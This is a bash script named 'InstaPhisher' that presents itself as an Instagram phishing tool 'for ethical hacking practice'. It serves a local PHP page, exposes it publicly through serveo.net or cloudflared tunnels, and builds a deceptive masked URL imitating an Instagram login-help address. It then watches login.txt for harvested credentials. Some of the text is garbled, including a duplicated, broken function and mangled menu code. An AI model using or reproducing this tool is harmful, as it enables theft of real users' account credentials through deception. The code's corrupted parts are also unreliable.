#!/bin/bash

Colors

RED='\033[1;31m' GRN='\033[1;32m' CYAN='\033[1;36m' YEL='\033[1;33m' NC='\033[0m' # No Color

clear

#Function: Typing animation

type_effect() {
  text="$1"
  delay=${2:-0.07}
  for ((i=0; i<${#text}; i++)); do
    printf "%s" "${text:$i:1}"
    sleep "$delay"
  done
  echo ""
}

#Function: Rainbow typing animation

rainbow_type() { text="$1" delay=${2:-0.03} COLORS=('\033[1;31m' '\033[1;33m' '\033[1;32m' '\033[1;36m' '\033[1;34m' '\033[1;35m') NC='\033[0m' color_index=0

rainbow_type() {
  text="$1"
  delay=${2:-0.03}
  COLORS=('\033[1;31m' '\033[1;33m' '\033[1;32m' '\033[1;36m' '\033[1;34m' '\033[1;35m')
  NC='\033[0m'
  color_index=0

  for ((i=0; i<${#text}; i++)); do
    char="${text:$i:1}"
    echo -en "${COLORS[$color_index]}$char${NC}"
    sleep "$delay"
    ((color_index=(color_index+1)%${#COLORS[@]}))
  done
  echo ""
}

Title with animation

figlet -f slant "InstaPhisher" | lolcat -a -d 4 rainbow_type "Instagram Phishing Tool for Ethical Hacking Practice" 0.03 rainbow_type "Created by: SACHIN BADASRA" 0.04

Install required packages if not already installed

if [ ! -f "$HOME/.mytool_installed" ]; then echo -e "${GRN}[+] Installing requirements...${NC}" pkg update -y > /dev/null 2>&1 pkg install php openssh git figlet toilet ruby -y > /dev/null 2>&1 gem install lolcat > /dev/null 2>&1 touch "$HOME/.mytool_installed" echo -e "${GRN}[+] Setup complete.${NC}" else echo -e "${GRN}[*] Requirements already installed.${NC}" fi

Localhost option

start_localhost() { echo -e "${GRN}[+] Starting localhost server at http://127.0.0.1:8080 ...${NC}" php -S 127.0.0.1:8080 > /dev/null 2>&1 & echo -e "${YEL}[!] Waiting for new credentials... (Press CTRL + C to exit)${NC}" tail -f login.txt 2>/dev/null }

Serveo option

start_serveo() { echo -e "${GRN}[+] Starting PHP server...${NC}" php -S 127.0.0.1:8080 > /dev/null 2>&1 & sleep 1 echo -e "${GRN}[+] Starting Serveo tunnel...${NC}" ssh -o StrictHostKeyChecking=no -R 80:localhost:8080 serveo.net > serveo.log 2>&1 & sleep 3 SERVEO_URL=$(grep -o "https://[a-zA-Z0-9.-]*.serveo.net" serveo.log)

if [ ! -z "$SERVEO_URL" ]; then MASKED_URL="https://instagram.com-login-help@${SERVEO_URL#https://}" echo -e "${GRN}[+] Serveo URL: $SERVEO_URL${NC}" echo -e "${CYAN}[+] Masked URL: $MASKED_URL${NC}" echo -e "${YEL}[!] Waiting for new credentials... (Press CTRL + C to exit)${NC}" tail -f login.txt 2>/dev/null else echo -e "${RED}[!] Failed to get Serveo URL. Check your connection.${NC}" fi }

Cloudflared option

start_cloudflared() { echo -e "${GRN}[+] Starting PHP server...${NC}" php -S 127.0.0.1:8080 > /dev/null 2>&1 & echo -e "${GRN}[+] Starting Cloudflared tunnel...${NC}" ./cloudflared tunnel --url http://localhost:8080 > cloudflared.log 2>&1 & sleep 3 CLOUDFLARE_URL=$(grep -o 'https://[-0-9a-z]*.trycloudflare.com' cloudflared.log)

if [ ! -z "$CLOUDFLARE_URL" ]; then echo -e "${GRN}[+] Cloudflared URL: $CLOUDFLARE_URL${NC}" echo -e "${YEL}[!] Waiting for new credentials... (Press CTRL + C to exit)${NC}" tail -f login.txt 2>/dev/null else echo -e "${RED}[!] Failed to get Cloudflared URL. Check logs.${NC}" fi }

Main Menu

echo -e "${CYAN}Choose Port Forwarding Method:${NC}" echo "1) Localhost (same device)" echo "2) Serveo.net (public)" echo "3) Cloudflared (public)" read -p $'\n>> ' choice

case $choice in

1. start_localhost;;


2. start_serveo;;


3. start_cloudflared;; *) echo -e "${RED}[!] Invalid choice.${NC}"; exit 1;; esac



